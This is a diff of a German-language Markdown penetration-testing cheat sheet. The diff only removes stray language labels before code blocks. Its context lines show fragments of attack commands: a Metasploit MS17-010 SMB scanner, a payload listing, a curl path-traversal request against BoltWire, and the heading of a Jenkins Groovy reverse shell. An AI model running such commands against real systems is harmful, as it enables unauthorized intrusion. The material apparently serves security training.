@@ -33,7 +33,6 @@ exploit
 
 **SMB Scanner (Vulnerability Verification):**
 
-bash
 
 ```bash
 use 24  # auxiliary/scanner/smb/smb_ms17_010
@@ -44,7 +43,6 @@ run
 
 **Payload-Änderung bei Fehlschlag:**
 
-msf
 
 ```msf
 show payloads linux/x86
@@ -158,7 +156,6 @@ curl "http://<TARGET_IP>:8080/boltwire/index.php?p=action.search&action=../../..
 
 **Jenkins Script Console (Groovy Reverse Shell):**
 
-groovy
 
 ```groovy
 # Login: http://<TARGET_IP>:8080
